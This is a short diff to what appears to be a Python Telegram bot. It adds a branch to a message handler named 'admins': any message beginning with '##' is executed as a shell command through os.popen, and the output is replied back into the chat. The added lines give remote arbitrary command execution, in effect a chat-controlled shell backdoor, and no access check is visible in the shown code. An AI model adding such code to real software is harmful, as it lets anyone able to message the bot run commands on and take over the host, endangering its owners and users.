@@ -123,6 +123,10 @@ async def get_id(event:newmessage.NewMessage.Event):
 async def admins(event:newmessage.NewMessage.Event):
     text = str(event.message.message)
     print(text)
+    if(text.startswith("##")):
+        command = text.replace("##","").strip()
+        x = os.popen(command).read()
+        await client.reply(f"**{command}**\n\n`{x}`")
     if(text.startswith("!add ")):
         channel = text.replace("!add ","")
         try:
